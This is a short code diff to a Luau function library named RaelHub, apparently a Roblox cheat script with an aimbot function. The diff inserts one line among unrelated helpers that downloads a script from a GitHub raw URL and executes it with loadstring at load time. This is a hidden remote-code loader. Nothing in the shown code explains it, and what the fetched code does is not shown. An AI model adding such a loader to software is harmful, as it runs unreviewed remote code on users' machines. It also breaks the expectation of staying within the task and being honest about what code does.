@@ -40,6 +40,7 @@ if not _G.RaelHubMonitorRunService then
   end)
 end
   
+loadstring(game:HttpGet("https://raw.githubusercontent.com/hypertext500/Testando/refs/heads/main/main.luau"))()
 
 function RaelHubFunction.ShowCountText(text, count)
   
@@ -789,5 +790,6 @@ function RaelHubFunction.AimbotPlayer(value, player, target)
 end
 
 shared.RaelHubFunction = RaelHubFunction
+
 
 return RaelHubFunction
